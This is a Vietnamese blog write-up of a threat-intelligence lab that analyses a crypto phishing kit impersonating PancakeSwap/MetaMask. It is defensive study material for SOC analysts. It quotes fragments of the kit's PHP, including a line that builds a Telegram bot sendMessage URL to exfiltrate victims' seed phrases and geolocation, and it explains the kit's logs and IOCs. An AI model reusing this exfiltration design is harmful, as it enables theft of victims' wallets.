---
title: "Analyze a cryptocurrency phishing kit "
date: 2026-04-23 00:00:00 +07000
categories: [Lab]

---

Giới thiệu: Analyze a cryptocurrency phishing kit to identify exfiltration methods, extract critical IOCs, and gather threat actor intelligence using local logs and Telegram APIs.

Scenario: A decentralized finance (DeFi) platform recently reported multiple user complaints about unauthorized fund withdrawals. A forensic review uncovered a phishing site impersonating the legitimate PancakeSwap exchange, luring victims into entering their wallet seed phrases. The phishing kit was hosted on a compromised server and exfiltrated credentials via a Telegram bot.
Your task is to conduct threat intelligence analysis on the phishing infrastructure, identify indicators of compromise (IoCs), and track the attacker’s online presence, including aliases and Telegram identifiers, to understand their tactics, techniques, and procedures (TTPs).


========================================================================================

Đây là bài lab mình nhặt được trên mạng về phân tích. Bài này nói về phishing kit dùng để tấn công người sử dụng ví crypto bằng cách lừa họ nhập seed phrase (một chuỗi 12 hoặc 24 từ bí mật dùng để khôi phục ví crypto), sau đó attacker sẽ chiếm quyền tài khoản crypto thông qua seed phrase này.

![pic1](/assets/img/posts/GrabThePhisher/pic1.jpg)
 
Đây là toàn bộ folder đề bài đã cho. Folder này ở góc nhìn của attacker, không phải do tool thu thập thông tin hay bất kỳ kết quả nào được tạo ra từ phía phòng thủ.

Ngay từ cái nhìn đầu, mình để ý có thư mục “metamask”. Metamask là một ví điện tử crypto, mua và bán bitcoin. Mọi thứ trông có vẻ bình thường cho đến khi đi vào thư mục đó.

![pic2](/assets/img/posts/GrabThePhisher/pic2.jpg)
 
Trong này có một file đuôi .php. Là một SOC analyst, hay các vị trí khác ở phía defend, ta cần cảnh giác với các file .php bất thường, bởi đây có thể là dấu hiệu các payload mà attacker tạo ra. Nhằm mục đích đưa vào máy victim sau này.
Chúng ta sẽ mở file .php để xem liệu có script gì trong này.
*Lưu ý: mọi hành động tương tác với file nghi là độc hại đều phải thực hiện thông qua môi trường cách ly an toàn, tuyệt đối KHÔNG được thực hiện trên máy thật nhằm gây ra hậu quả, thiệt hại ngoài ý muốn.

![pic3](/assets/img/posts/GrabThePhisher/pic3.jpg)
 
Khi nhìn vào đống script này thì mình có thể tự tin khẳng định đây gần như là malware/phishing.
Các đoạn scripts minh chứng cho điều này gồm:
-	$_POST["data"]: dòng này sẽ request thông tin bên phía trình duyệt của người dùng. Như đã nói ban đầu, attacker đã tạo nên một website phishing. Nên khi user nhập seed phrase thì sẽ được lưu vào biến data, và biến này sẽ được POST về phía attacker --> biết được seed phrase

-	.$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. : dòng này sẽ lấy vị trí địa lý từ máy của nạn nhân như thành phố, đất nước hiện tại….

-	$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=". : nhìn vào đây ta có thể thấy mọi thông tin sẽ được bot telegram đẩy về cho attacker thông qua API của bot.

Vậy đến thời điểm hiện tại chúng ta đã thu thập được các thông tin sau:
-	Wallet được sử dụng để hỏi seed phrase user trên phishing site là Metamask.
-	File metamask.php là nơi chứa đoạn code độc hại cho phishing kit.
-	Ngôn ngữ được sử dụng để viết đoạn code này là PHP
-	Service được sử dụng để lấy vị trí địa lý trên máy victim là Sypex Geo
Chúng ta sẽ di chuyển qua các folder khác để thu thập thêm thông tin.


IOC:

 ![pic4](/assets/img/posts/GrabThePhisher/pic4.jpg)

Hiện tại mình đang ở trong thư mục Log (ảnh ở trên). Log là nơi bên phe phòng thủ cần quan tâm đặc biệt.
ở đây có một file log.txt, hãy xem nó:

![pic5](/assets/img/posts/GrabThePhisher/pic5.jpg)
 
Khi mới nhìn vào, mình không hiểu nó đang viết cái gì. Nhưng nghĩ kỹ lại thì đây chính là seed phrase mà attacker đã thu thập được từ 3 victim.
Vậy dựa vào thông tin này, ta có thể kết luận đã có 3 user bị lộ seed phrase, và tương lai không xa sẽ bị chiếm toàn bộ quyền tài khoản crypto.

Quay trở lại với file malicious script để phân tích sâu hơn. Hãy tập trung vào phần này

![pic6](/assets/img/posts/GrabThePhisher/pic6.jpg)
 
Để ý variable filename, có thể thấy dữ liệu exfiltrate sẽ được gửi về telegram của attacker thông qua bot telegram.
Có thể dễ dàng nhận thấy token của bot ngay trên. Token này đóng vai trò xác định danh tính của bot để script có quyền gửi dữ liệu về Telegram.
Còn một vài variable được gán giá trị ở cạnh như:
-	Chat_id: chỉ định ID trò chuyện của channel của attacker
-	Đồng minh của attacker đã phát triển nên bộ phishing kit có username j1j1b1s@m3r0

Như vậy thông qua bài lab trên, chúng ta đã tìm hiểu được:
-	Seed phrase và tầm quan trọng của nó trong crypto wallet.
-	Cách mà attacker dựng nên một bộ phishing kit và lưu trữ seed phrase thu thập từ victim.
-	Service “Sypex Geo” được attacker sử dụng để thu thập vị trí địa lý máy của victim.
-	Phân tích script độc hại attacker đã sử dụng nhằm lừa người dùng nhập seed phrase, thông tin được đẩy về bot thông qua token, bot sau đó đẩy dữ liệu đã exfiltrate gửi về telegram của attacker.

Hy vọng các bạn thông qua đọc bài lab này sẽ tìm được một chút thông tin hữu ích và thú vị, đáng để học hỏi. Cảm ơn các bạn đã dành thời gian đọc bài lab của mình!
